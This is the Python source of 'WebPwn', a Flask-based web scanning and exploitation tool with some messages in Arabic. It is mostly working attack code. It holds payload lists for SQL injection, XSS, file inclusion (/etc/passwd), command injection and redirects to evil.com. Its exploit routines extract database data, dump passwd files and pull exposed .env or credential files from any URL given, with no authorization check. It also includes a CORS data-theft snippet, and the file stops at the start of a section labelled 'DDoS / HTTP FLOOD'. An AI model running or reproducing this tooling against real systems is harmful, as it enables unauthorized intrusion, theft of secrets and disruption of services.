#!/usr/bin/env python3
"""
WebPwn - Full-fidelity Web Vulnerability Scanner & Exploitation Toolkit
"""

from flask import Flask, request, jsonify, send_from_directory, render_template_string
from flask_cors import CORS
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import re
import time
import socket
import ssl
import concurrent.futures
from datetime import datetime
import json
import hashlib
import base64

app = Flask(__name__, static_folder="static")
CORS(app)

# Timeout and headers for all requests
TIMEOUT = 12
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 WebPwn/1.0"
DEFAULT_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,ar;q=0.9",
    "Connection": "close",
}

# ====================== PAYLOADS ======================
SQLI_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT 1--",
    "admin'--",
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND SLEEP(3)--",
    "1' AND SLEEP(3)--",
    "1 AND SLEEP(3)",
    "' OR SLEEP(3)--",
    "'; IF(1=1,SLEEP(3),0)--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "'-alert(1)-'",
    "<details open ontoggle=alert(1)>",
]

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....\\/....\\/....\\/....\\/etc\\/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]

CMD_INJECTION_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https:evil.com",
    "////evil.com",
    "https://google.com",
]

SENSITIVE_PATHS = [
    "/.env",
    "/.git/HEAD",
    "/.git/config",
    "/robots.txt",
    "/sitemap.xml",
    "/.htaccess",
    "/web.config",
    "/backup",
    "/backup.zip",
    "/backup.sql",
    "/db.sql",
    "/dump.sql",
    "/admin",
    "/admin/",
    "/administrator",
    "/wp-admin",
    "/wp-login.php",
    "/phpmyadmin",
    "/phpinfo.php",
    "/info.php",
    "/server-status",
    "/.DS_Store",
    "/config.php",
    "/config.json",
    "/package.json",
    "/composer.json",
    "/.aws/credentials",
    "/api",
    "/api/v1",
    "/swagger",
    "/swagger-ui",
    "/graphql",
    "/debug",
    "/console",
    "/.well-known/security.txt",
]

SQL_ERRORS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.*SQL[\-\_\ ]*Server",
    r"OLE DB.*SQL Server",
    r"SQLServer JDBC Driver",
    r"SqlException",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*\Woci_",
    r"Warning.*\Wora_",
    r"quoted string not properly terminated",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_",
    r"Warning.*SQLite3::",
    r"\[SQLITE_ERROR\]",
    r"SQLSTATE\[",
    r"syntax error at or near",
    r"unclosed quotation mark after the character string",
    r"Microsoft OLE DB Provider for ODBC Drivers",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Incorrect syntax near",
    r"You have an error in your SQL syntax",
]

def normalize_url(url: str) -> str:
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

def safe_request(url, method="GET", params=None, data=None, headers=None, allow_redirects=True, timeout=TIMEOUT):
    h = DEFAULT_HEADERS.copy()
    if headers:
        h.update(headers)
    try:
        if method.upper() == "GET":
            r = requests.get(url, params=params, headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=False)
        else:
            r = requests.post(url, data=data, headers=h, timeout=timeout, allow_redirects=allow_redirects, verify=False)
        return r
    except Exception as e:
        return None

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

def check_headers(url):
    results = []
    r = safe_request(url)
    if not r:
        return [{"name": "Connection Failed", "severity": "critical", "detail": "Could not reach the target"}]
    
    headers = {k.lower(): v for k, v in r.headers.items()}
    
    security_headers = {
        "strict-transport-security": ("HSTS", "high", "Missing Strict-Transport-Security"),
        "content-security-policy": ("CSP", "high", "Missing Content-Security-Policy"),
        "x-frame-options": ("X-Frame-Options", "medium", "Missing X-Frame-Options (clickjacking)"),
        "x-content-type-options": ("X-Content-Type-Options", "medium", "Missing X-Content-Type-Options"),
        "x-xss-protection": ("X-XSS-Protection", "low", "Missing X-XSS-Protection"),
        "referrer-policy": ("Referrer-Policy", "low", "Missing Referrer-Policy"),
        "permissions-policy": ("Permissions-Policy", "low", "Missing Permissions-Policy"),
    }
    
    for h, (name, sev, msg) in security_headers.items():
        if h not in headers:
            results.append({"name": name, "severity": sev, "detail": msg, "evidence": "Header absent"})
    
    # Server fingerprint
    if "server" in headers:
        results.append({"name": "Server Header", "severity": "info", "detail": f"Server: {headers['server']}", "evidence": headers["server"]})
    if "x-powered-by" in headers:
        results.append({"name": "X-Powered-By", "severity": "info", "detail": f"X-Powered-By: {headers['x-powered-by']}", "evidence": headers["x-powered-by"]})
    
    # Cookies
    if "set-cookie" in headers:
        cookie = headers["set-cookie"].lower()
        if "httponly" not in cookie:
            results.append({"name": "Cookie HttpOnly", "severity": "medium", "detail": "Cookies missing HttpOnly flag", "evidence": headers["set-cookie"][:120]})
        if "secure" not in cookie and url.startswith("https"):
            results.append({"name": "Cookie Secure", "severity": "medium", "detail": "Cookies missing Secure flag", "evidence": headers["set-cookie"][:120]})
        if "samesite" not in cookie:
            results.append({"name": "Cookie SameSite", "severity": "low", "detail": "Cookies missing SameSite attribute", "evidence": headers["set-cookie"][:120]})
    
    return results

def check_sensitive_paths(url):
    results = []
    base = normalize_url(url)
    
    def check_one(path):
        target = urljoin(base + "/", path.lstrip("/"))
        r = safe_request(target, allow_redirects=False)
        if r is None:
            return None
        status = r.status_code
        length = len(r.content)
        interesting = False
        detail = f"Status {status}, size {length}"
        
        if status in (200, 201, 403) and length > 0:
            # Heuristics for interesting content
            text = r.text[:2000].lower() if r.text else ""
            if path.endswith((".env", "config", "credentials")) and ("=" in text or "password" in text or "secret" in text or "key" in text):
                interesting = True
                detail = f"Possible secret file exposed (status {status})"
            elif path in ("/.git/HEAD", "/.git/config") and ("ref:" in text or "[core]" in text):
                interesting = True
                detail = "Git repository exposed"
            elif path == "/robots.txt" and "user-agent" in text:
                interesting = True
                detail = "robots.txt found"
            elif status == 200 and length > 100 and path not in ("/robots.txt", "/sitemap.xml"):
                interesting = True
                detail = f"Accessible path (status {status}, {length} bytes)"
            elif status == 403:
                interesting = True
                detail = f"Forbidden but exists (status 403)"
        
        if interesting:
            return {"name": f"Sensitive Path: {path}", "severity": "high" if any(x in path for x in [".env", ".git", "backup", "sql", "phpmyadmin", "admin"]) else "medium",
                    "detail": detail, "evidence": target, "url": target, "status": status}
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_one, p): p for p in SENSITIVE_PATHS}
        for fut in concurrent.futures.as_completed(futures):
            res = fut.result()
            if res:
                results.append(res)
    return results

def check_sqli(url):
    results = []
    r = safe_request(url)
    if not r:
        return results
    
    # Find forms and URL params
    soup = BeautifulSoup(r.text, "lxml")
    forms = soup.find_all("form")
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    # Test URL parameters first
    if query_params:
        for param in list(query_params.keys())[:5]:  # limit
            original = query_params[param][0] if query_params[param] else "1"
            for payload in SQLI_PAYLOADS[:8]:
                new_params = query_params.copy()
                new_params[param] = [payload]
                test_url = parsed._replace(query=urlencode(new_params, doseq=True)).geturl()
                start = time.time()
                tr = safe_request(test_url, timeout=8)
                elapsed = time.time() - start
                if tr is None:
                    continue
                body = tr.text[:5000] if tr.text else ""
                # Error based
                for err in SQL_ERRORS:
                    if re.search(err, body, re.I):
                        results.append({
                            "name": "SQL Injection (Error-based)",
                            "severity": "critical",
                            "detail": f"Parameter '{param}' reflects SQL error with payload",
                            "evidence": f"Payload: {payload[:60]} | Error pattern matched",
                            "param": param,
                            "payload": payload,
                            "url": test_url
                        })
                        break
                # Time based
                if elapsed > 2.8 and "SLEEP" in payload.upper():
                    results.append({
                        "name": "SQL Injection (Time-based)",
                        "severity": "critical",
                        "detail": f"Parameter '{param}' delayed response ~{elapsed:.1f}s",
                        "evidence": f"Payload: {payload}",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    })
    
    # Test forms (simple GET/POST)
    for form in forms[:3]:
        action = form.get("action") or url
        action = urljoin(url, action)
        method = (form.get("method") or "get").lower()
        inputs = form.find_all(["input", "textarea"])
        data = {}
        for inp in inputs:
            name = inp.get("name")
            if not name:
                continue
            itype = inp.get("type", "text").lower()
            if itype in ("submit", "button", "image", "file"):
                continue
            data[name] = inp.get("value") or "test"
        
        if not data:
            continue
        
        for pname in list(data.keys())[:4]:
            for payload in SQLI_PAYLOADS[:6]:
                test_data = data.copy()
                test_data[pname] = payload
                start = time.time()
                if method == "post":
                    tr = safe_request(action, method="POST", data=test_data, timeout=8)
                else:
                    tr = safe_request(action, params=test_data, timeout=8)
                elapsed = time.time() - start
                if tr is None:
                    continue
                body = tr.text[:4000] if tr.text else ""
                for err in SQL_ERRORS:
                    if re.search(err, body, re.I):
                        results.append({
                            "name": "SQL Injection (Form Error-based)",
                            "severity": "critical",
                            "detail": f"Form field '{pname}' vulnerable",
                            "evidence": f"Payload: {payload[:50]}",
                            "param": pname,
                            "payload": payload,
                            "url": action,
                            "method": method
                        })
                        break
                if elapsed > 2.8 and "SLEEP" in payload.upper():
                    results.append({
                        "name": "SQL Injection (Form Time-based)",
                        "severity": "critical",
                        "detail": f"Form field '{pname}' time delay {elapsed:.1f}s",
                        "evidence": f"Payload: {payload}",
                        "param": pname,
                        "payload": payload,
                        "url": action
                    })
    
    # Dedup by name+param
    seen = set()
    unique = []
    for item in results:
        key = (item["name"], item.get("param", ""))
        if key not in seen:
            seen.add(key)
            unique.append(item)
    return unique

def check_xss(url):
    results = []
    r = safe_request(url)
    if not r:
        return results
    soup = BeautifulSoup(r.text, "lxml")
    forms = soup.find_all("form")
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    # URL params
    if query_params:
        for param in list(query_params.keys())[:4]:
            for payload in XSS_PAYLOADS[:6]:
                new_params = query_params.copy()
                new_params[param] = [payload]
                test_url = parsed._replace(query=urlencode(new_params, doseq=True)).geturl()
                tr = safe_request(test_url)
                if tr and payload in (tr.text or ""):
                    results.append({
                        "name": "Reflected XSS",
                        "severity": "high",
                        "detail": f"Parameter '{param}' reflects payload without encoding",
                        "evidence": f"Payload appeared in response: {payload[:40]}",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    })
                    break  # one per param is enough
    
    # Forms
    for form in forms[:2]:
        action = form.get("action") or url
        action = urljoin(url, action)
        method = (form.get("method") or "get").lower()
        inputs = form.find_all(["input", "textarea"])
        data = {}
        for inp in inputs:
            name = inp.get("name")
            if name and inp.get("type", "text").lower() not in ("submit", "button", "hidden", "file"):
                data[name] = "test"
        if not data:
            continue
        for pname in list(data.keys())[:3]:
            for payload in XSS_PAYLOADS[:4]:
                test_data = data.copy()
                test_data[pname] = payload
                if method == "post":
                    tr = safe_request(action, method="POST", data=test_data)
                else:
                    tr = safe_request(action, params=test_data)
                if tr and payload in (tr.text or ""):
                    results.append({
                        "name": "Reflected XSS (Form)",
                        "severity": "high",
                        "detail": f"Form field '{pname}' reflects unescaped payload",
                        "evidence": payload[:50],
                        "param": pname,
                        "payload": payload,
                        "url": action
                    })
                    break
    return results

def check_lfi(url):
    results = []
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    if not query_params:
        # Try common param names
        for common in ["file", "page", "path", "include", "doc", "document", "folder", "root", "pg"]:
            test_params = {common: LFI_PAYLOADS[0]}
            test_url = parsed._replace(query=urlencode(test_params)).geturl()
            tr = safe_request(test_url)
            if tr and ("root:" in (tr.text or "") or "bin/bash" in (tr.text or "") or "daemon:" in (tr.text or "")):
                results.append({
                    "name": "Local File Inclusion",
                    "severity": "critical",
                    "detail": f"Parameter '{common}' allows reading /etc/passwd",
                    "evidence": "Found passwd-like content",
                    "param": common,
                    "payload": LFI_PAYLOADS[0],
                    "url": test_url
                })
                break
        return results
    
    for param in list(query_params.keys())[:4]:
        for payload in LFI_PAYLOADS[:5]:
            new_params = query_params.copy()
            new_params[param] = [payload]
            test_url = parsed._replace(query=urlencode(new_params, doseq=True)).geturl()
            tr = safe_request(test_url)
            if tr:
                body = tr.text or ""
                if "root:" in body and "bin/" in body:
                    results.append({
                        "name": "Local File Inclusion / Path Traversal",
                        "severity": "critical",
                        "detail": f"Parameter '{param}' reads local files",
                        "evidence": "Detected /etc/passwd content",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    })
                    break
                if "php://filter" in payload and len(body) > 100 and re.search(r"[A-Za-z0-9+/=]{50,}", body):
                    results.append({
                        "name": "LFI via php://filter",
                        "severity": "high",
                        "detail": f"Parameter '{param}' allows php filter",
                        "evidence": "Base64-like content returned",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    })
                    break
    return results

def check_open_redirect(url):
    results = []
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    redirect_params = ["url", "redirect", "next", "return", "returnUrl", "goto", "dest", "destination", "rurl", "redirect_uri", "continue", "out"]
    
    candidates = []
    if query_params:
        for p in query_params:
            if p.lower() in redirect_params or "url" in p.lower() or "redirect" in p.lower():
                candidates.append(p)
    if not candidates:
        candidates = redirect_params[:3]
    
    for param in candidates[:4]:
        for payload in OPEN_REDIRECT_PAYLOADS[:3]:
            if query_params:
                new_params = query_params.copy()
                new_params[param] = [payload]
                test_url = parsed._replace(query=urlencode(new_params, doseq=True)).geturl()
            else:
                test_url = parsed._replace(query=urlencode({param: payload})).geturl()
            tr = safe_request(test_url, allow_redirects=False)
            if tr and tr.status_code in (301, 302, 303, 307, 308):
                loc = tr.headers.get("Location", "")
                if "evil.com" in loc or "google.com" in loc or loc.startswith("//"):
                    results.append({
                        "name": "Open Redirect",
                        "severity": "medium",
                        "detail": f"Parameter '{param}' redirects to external domain",
                        "evidence": f"Location: {loc[:80]}",
                        "param": param,
                        "payload": payload,
                        "url": test_url
                    })
                    break
    return results

def fingerprint(url):
    results = []
    r = safe_request(url)
    if not r:
        return results
    headers = {k.lower(): v for k, v in r.headers.items()}
    body = r.text[:8000] if r.text else ""
    
    tech = []
    if "x-powered-by" in headers:
        tech.append(headers["x-powered-by"])
    if "server" in headers:
        tech.append(headers["server"])
    if "wp-content" in body or "wp-includes" in body:
        tech.append("WordPress")
    if "drupal" in body.lower() or "sites/default" in body:
        tech.append("Drupal")
    if "joomla" in body.lower():
        tech.append("Joomla")
    if "laravel" in body.lower() or "XSRF-TOKEN" in str(r.cookies):
        tech.append("Laravel")
    if "csrf-token" in body.lower() or "django" in body.lower():
        tech.append("Django / possible")
    if "react" in body.lower() or "__NEXT_DATA__" in body:
        tech.append("React / Next.js")
    if "ng-version" in body or "angular" in body.lower():
        tech.append("Angular")
    if "vue" in body.lower() and "data-v-" in body:
        tech.append("Vue.js")
    
    if tech:
        results.append({"name": "Technology Fingerprint", "severity": "info", "detail": ", ".join(set(tech)), "evidence": "Headers + body signatures"})
    
    # Title
    soup = BeautifulSoup(body, "lxml")
    title = soup.title.string.strip() if soup.title and soup.title.string else "N/A"
    results.append({"name": "Page Title", "severity": "info", "detail": title[:100], "evidence": title[:100]})
    
    return results

def check_ssl(url):
    results = []
    parsed = urlparse(normalize_url(url))
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    if parsed.scheme != "https":
        results.append({"name": "No HTTPS", "severity": "medium", "detail": "Site does not use HTTPS", "evidence": url})
        return results
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=8) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                version = ssock.version()
                results.append({"name": "TLS Version", "severity": "info", "detail": version, "evidence": version})
                if cert:
                    not_after = cert.get("notAfter", "")
                    results.append({"name": "Certificate Expiry", "severity": "info", "detail": not_after, "evidence": not_after})
                    issuer = dict(x[0] for x in cert.get("issuer", []))
                    results.append({"name": "Certificate Issuer", "severity": "info", "detail": issuer.get("organizationName", str(issuer)), "evidence": str(issuer)})
    except Exception as e:
        results.append({"name": "SSL Error", "severity": "medium", "detail": str(e)[:120], "evidence": str(e)[:80]})
    return results


def check_cors(url):
    """Detect CORS misconfigurations"""
    results = []
    evil_origin = "https://evil-cors-test.com"
    r = safe_request(url, headers={"Origin": evil_origin})
    if not r:
        return results
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if acao == "*":
        results.append({
            "name": "CORS Misconfiguration (Wildcard)",
            "severity": "medium",
            "detail": "Access-Control-Allow-Origin: * — أي موقع يقدر يقرأ الردود",
            "evidence": f"ACAO: {acao}",
            "payload": evil_origin
        })
    elif acao == evil_origin:
        sev = "high" if acac.lower() == "true" else "medium"
        results.append({
            "name": "CORS Misconfiguration (Origin Reflection)",
            "severity": sev,
            "detail": f"السيرفر بيعكس أي Origin{(' مع Credentials' if acac.lower()=='true' else '')}",
            "evidence": f"ACAO: {acao} | ACAC: {acac}",
            "payload": evil_origin
        })
    return results


def check_info_disclosure(url):
    """Search for emails, API keys, internal IPs, stack traces, etc."""
    results = []
    r = safe_request(url)
    if not r or not r.text:
        return results
    body = r.text

    # Emails
    emails = set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", body))
    emails = [e for e in emails if not e.endswith((".png", ".jpg", ".gif", ".css", ".js"))][:8]
    if emails:
        results.append({
            "name": "Email Addresses Disclosed",
            "severity": "low",
            "detail": f"تم العثور على {len(emails)} إيميل في الصفحة",
            "evidence": ", ".join(emails[:5])
        })

    # API keys / tokens patterns
    key_patterns = [
        (r"(?i)(api[_-]?key|apikey|api_secret)[\"'\s:=]+([a-zA-Z0-9_\-]{16,})", "API Key"),
        (r"(?i)(secret[_-]?key|access[_-]?token)[\"'\s:=]+([a-zA-Z0-9_\-]{16,})", "Secret / Token"),
        (r"AKIA[0-9A-Z]{16}", "AWS Access Key"),
        (r"ghp_[a-zA-Z0-9]{36}", "GitHub Token"),
        (r"sk_live_[a-zA-Z0-9]{24,}", "Stripe Live Key"),
    ]
    for pat, name in key_patterns:
        found = re.findall(pat, body)
        if found:
            results.append({
                "name": f"Possible {name} Leaked",
                "severity": "high",
                "detail": f"تم اكتشاف نمط {name} في الكود المصدري",
                "evidence": str(found[0])[:80]
            })

    # Stack traces / debug
    if re.search(r"(Traceback \(most recent call last\)|Exception in thread|Stack overflow|Fatal error:|PostgreSQL.*ERROR|SQLSTATE\[)", body, re.I):
        results.append({
            "name": "Stack Trace / Debug Info",
            "severity": "medium",
            "detail": "معلومات خطأ أو Debug ظاهرة في الرد",
            "evidence": "Stack trace or fatal error detected"
        })

    # Internal IPs
    internal_ips = re.findall(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b", body)
    if internal_ips:
        results.append({
            "name": "Internal IP Disclosure",
            "severity": "low",
            "detail": f"عناوين IP داخلية ظاهرة: {', '.join(set(internal_ips)[:4])}",
            "evidence": ", ".join(set(internal_ips)[:5])
        })

    return results


def check_http_methods(url):
    """Check for dangerous HTTP methods"""
    results = []
    dangerous = ["PUT", "DELETE", "TRACE", "CONNECT", "PATCH"]
    for method in dangerous:
        try:
            r = requests.request(method, url, headers=DEFAULT_HEADERS, timeout=6, verify=False, allow_redirects=False)
            if r is not None and r.status_code < 400:
                sev = "high" if method in ("PUT", "DELETE") else "medium"
                results.append({
                    "name": f"Dangerous Method Enabled: {method}",
                    "severity": sev,
                    "detail": f"الطريقة {method} مسموحة (Status {r.status_code})",
                    "evidence": f"HTTP {method} → {r.status_code}",
                    "payload": method
                })
        except Exception:
            pass
    return results


def check_directory_listing(url):
    """Detect directory listing"""
    results = []
    candidates = ["/", "/images/", "/uploads/", "/files/", "/static/", "/assets/", "/backup/", "/tmp/", "/data/"]
    base = normalize_url(url)
    for path in candidates:
        target = urljoin(base + "/", path.lstrip("/"))
        r = safe_request(target)
        if r and r.status_code == 200 and r.text:
            text = r.text.lower()
            if ("index of /" in text or "directory listing for" in text or 
                ("parent directory" in text and "<a href=" in text and "last modified" in text)):
                results.append({
                    "name": "Directory Listing Enabled",
                    "severity": "medium",
                    "detail": f"قائمة الملفات مفتوحة على: {path}",
                    "evidence": target,
                    "url": target
                })
    return results


def check_source_maps(url):
    """Check for exposed source maps"""
    results = []
    r = safe_request(url)
    if not r or not r.text:
        return results
    # Find .js files and check for .map
    js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text, re.I)[:8]
    base = normalize_url(url)
    for js in js_files:
        js_url = urljoin(base + "/", js)
        map_url = js_url + ".map"
        mr = safe_request(map_url, allow_redirects=False)
        if mr and mr.status_code == 200 and ("mappings" in (mr.text or "") or "sources" in (mr.text or "")):
            results.append({
                "name": "Source Map Exposed",
                "severity": "medium",
                "detail": f"ملف Source Map متاح: {map_url}",
                "evidence": map_url,
                "url": map_url
            })
    return results


def check_csrf(url):
    """Basic CSRF check - forms without tokens"""
    results = []
    r = safe_request(url)
    if not r or not r.text:
        return results
    soup = BeautifulSoup(r.text, "lxml")
    forms = soup.find_all("form")
    for i, form in enumerate(forms[:5]):
        method = (form.get("method") or "get").lower()
        if method != "post":
            continue
        inputs = form.find_all("input")
        has_token = False
        for inp in inputs:
            name = (inp.get("name") or "").lower()
            if any(t in name for t in ["csrf", "token", "_token", "authenticity", "nonce", "xsrf"]):
                has_token = True
                break
        if not has_token:
            action = form.get("action") or url
            results.append({
                "name": "Possible CSRF (No Token)",
                "severity": "medium",
                "detail": f"فورم POST بدون CSRF Token (form #{i+1})",
                "evidence": f"Action: {action[:80]}",
                "url": urljoin(url, action)
            })
    return results


# ====================== EXPLOIT FUNCTIONS ======================
def exploit_sqli(url, param, payload, method="GET"):

    """Attempt basic data extraction on confirmed SQLi"""
    results = {"success": False, "data": [], "messages": []}
    # Try to extract version / user / database name with common techniques
    extraction_payloads = [
        f"{payload} UNION SELECT @@version,NULL--",
        f"{payload} UNION SELECT version(),NULL--",
        f"{payload} UNION SELECT user(),NULL--",
        f"{payload} UNION SELECT database(),NULL--",
        f"{payload} UNION SELECT table_name,NULL FROM information_schema.tables--",
        f"1' UNION SELECT @@version--",
        f"1 UNION SELECT @@version--",
        f"' UNION SELECT 1,@@version--",
    ]
    
    parsed = urlparse(url)
    for ep in extraction_payloads:
        try:
            if method.upper() == "GET":
                # Replace or append
                qs = parse_qs(parsed.query)
                if param in qs:
                    qs[param] = [ep]
                else:
                    qs[param] = [ep]
                test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
                r = safe_request(test_url, timeout=10)
            else:
                r = safe_request(url, method="POST", data={param: ep}, timeout=10)
            
            if r and r.text:
                # Look for version-like strings
                version_match = re.search(r"(\d+\.\d+\.\d+[-\w]*)", r.text)
                if version_match or "MariaDB" in r.text or "PostgreSQL" in r.text or "mysql" in r.text.lower():
                    results["success"] = True
                    results["data"].append({"type": "version/db", "snippet": r.text[:300]})
                    results["messages"].append(f"Possible extraction with: {ep[:60]}")
                    break
        except:
            continue
    if not results["success"]:
        results["messages"].append("Could not extract data automatically. Manual exploitation may still be possible with the confirmed payload.")
    return results

def exploit_lfi(url, param, payload):
    results = {"success": False, "data": [], "messages": []}
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    test_url = parsed._replace(query=urlencode(qs, doseq=True)).geturl()
    r = safe_request(test_url)
    if r and r.text and ("root:" in r.text or "daemon:" in r.text):
        results["success"] = True
        # Extract first few lines of passwd
        lines = [l for l in r.text.splitlines() if ":" in l and len(l) < 120][:15]
        results["data"] = lines
        results["messages"].append("Successfully read /etc/passwd (or equivalent)")
    else:
        results["messages"].append("File read did not return expected content")
    return results

# ====================== API ROUTES ======================
@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route("/api/scan", methods=["POST"])
def api_scan():
    data = request.get_json() or {}
    target = data.get("url", "").strip()
    modules = data.get("modules", ["headers", "paths", "sqli", "xss", "lfi", "redirect", "fingerprint", "ssl", "cors", "info", "methods", "dirlist", "sourcemap", "csrf"])
    
    if not target:
        return jsonify({"error": "URL required"}), 400
    
    target = normalize_url(target)
    
    all_results = []
    start = time.time()
    
    try:
        if "fingerprint" in modules:
            all_results.extend(fingerprint(target))
        if "ssl" in modules:
            all_results.extend(check_ssl(target))
        if "headers" in modules:
            all_results.extend(check_headers(target))
        if "paths" in modules:
            all_results.extend(check_sensitive_paths(target))
        if "sqli" in modules:
            all_results.extend(check_sqli(target))
        if "xss" in modules:
            all_results.extend(check_xss(target))
        if "lfi" in modules:
            all_results.extend(check_lfi(target))
        if "redirect" in modules:
            all_results.extend(check_open_redirect(target))
        if "cors" in modules:
            all_results.extend(check_cors(target))
        if "info" in modules:
            all_results.extend(check_info_disclosure(target))
        if "methods" in modules:
            all_results.extend(check_http_methods(target))
        if "dirlist" in modules:
            all_results.extend(check_directory_listing(target))
        if "sourcemap" in modules:
            all_results.extend(check_source_maps(target))
        if "csrf" in modules:
            all_results.extend(check_csrf(target))
    except Exception as e:
        return jsonify({"error": str(e), "results": all_results}), 500

    
    elapsed = round(time.time() - start, 2)
    
    # Sort by severity
    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    all_results.sort(key=lambda x: sev_order.get(x.get("severity", "info"), 5))
    
    summary = {
        "critical": sum(1 for r in all_results if r.get("severity") == "critical"),
        "high": sum(1 for r in all_results if r.get("severity") == "high"),
        "medium": sum(1 for r in all_results if r.get("severity") == "medium"),
        "low": sum(1 for r in all_results if r.get("severity") == "low"),
        "info": sum(1 for r in all_results if r.get("severity") == "info"),
    }
    
    return jsonify({
        "target": target,
        "elapsed": elapsed,
        "summary": summary,
        "results": all_results,
        "scanned_at": datetime.utcnow().isoformat() + "Z"
    })

@app.route("/api/exploit", methods=["POST"])
def api_exploit():
    data = request.get_json() or {}
    url = data.get("url", "")
    vuln_type = data.get("type", "")
    param = data.get("param", "")
    payload = data.get("payload", "")
    method = data.get("method", "GET")
    
    if not url or not vuln_type:
        return jsonify({"error": "Missing parameters"}), 400
    
    url = normalize_url(url)
    
    if "sql" in vuln_type.lower():
        result = exploit_sqli(url, param, payload, method)
    elif "lfi" in vuln_type.lower() or "file" in vuln_type.lower() or "path traversal" in vuln_type.lower():
        result = exploit_lfi(url, param, payload)
    elif "sensitive path" in vuln_type.lower() or "path:" in vuln_type.lower():
        # Try to fetch the sensitive file
        r = safe_request(url)
        if r and r.status_code == 200 and len(r.text) > 0:
            result = {
                "success": True,
                "messages": [f"تم جلب الملف بنجاح (Status {r.status_code}, حجم {len(r.text)} بايت)"],
                "data": [r.text[:3000]]
            }
        else:
            result = {"success": False, "messages": ["الملف غير متاح أو فاضي"], "data": []}
    elif "xss" in vuln_type.lower():
        result = {
            "success": True,
            "messages": [
                "XSS منعكس مؤكد. استخدم الـ Payload في المتصفح:",
                f"Payload: {payload}",
                "جرب تفتح الرابط في المتصفح وشوف إذا ظهر alert"
            ],
            "data": [{"payload": payload, "url": url}]
        }
    elif "cors" in vuln_type.lower():
        result = {
            "success": True,
            "messages": [
                "CORS ضعيف. يمكن قراءة الردود من أي Origin.",
                "استخدم هذا الكود في كونسول أي موقع:",
                f"fetch('{url}', {{credentials:'include'}}).then(r=>r.text()).then(console.log)"
            ],
            "data": []
        }
    else:
        result = {"success": False, "messages": ["مفيش استغلال أوتوماتيك للنوع ده حالياً. استخدم الطلب المخصص."], "data": []}
    
    return jsonify(result)


@app.route("/api/raw", methods=["POST"])
def api_raw():
    """Send custom request (for advanced exploitation)"""
    data = request.get_json() or {}
    url = data.get("url", "")
    method = data.get("method", "GET").upper()
    headers = data.get("headers", {})
    body = data.get("body", None)
    params = data.get("params", None)
    
    if not url:
        return jsonify({"error": "URL required"}), 400
    
    try:
        h = DEFAULT_HEADERS.copy()
        h.update(headers or {})
        if method == "GET":
            r = requests.get(url, params=params, headers=h, timeout=15, verify=False, allow_redirects=False)
        else:
            r = requests.request(method, url, data=body, params=params, headers=h, timeout=15, verify=False, allow_redirects=False)
        
        return jsonify({
            "status": r.status_code,
            "headers": dict(r.headers),
            "body": r.text[:15000],
            "url": r.url,
            "elapsed": r.elapsed.total_seconds()
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ====================== DDoS / HTTP FLOOD ======================
@app.route("/api/ddos", methods=["POST"])
